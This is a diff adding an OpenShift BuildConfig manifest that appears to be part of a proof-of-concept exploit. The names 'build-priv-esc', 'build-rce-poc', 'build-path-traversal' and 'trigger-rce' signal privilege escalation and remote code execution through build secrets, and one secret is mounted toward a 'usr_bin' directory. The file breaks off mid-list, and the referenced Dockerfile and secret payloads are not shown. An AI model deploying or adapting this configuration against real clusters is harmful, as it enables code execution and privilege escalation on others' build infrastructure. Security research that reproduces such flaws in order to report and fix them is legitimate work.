@@ -1,0 +1,22 @@
+kind: BuildConfig
+apiVersion: build.openshift.io/v1
+metadata:
+  name: build-priv-esc
+spec:
+  nodeSelector: null
+  strategy:
+    type: Docker
+    dockerStrategy:    
+      dockerfilePath: Dockerfile
+  source:
+    type: Git
+    git:
+      uri: 'https://<REDACTED>/build-rce-poc.git'
+      ref: main
+    contextDir: /
+    secrets:
+      - secret:
+          name: build-path-traversal
+        destinationDir: usr_bin
+      - secret:
+          name: trigger-rce
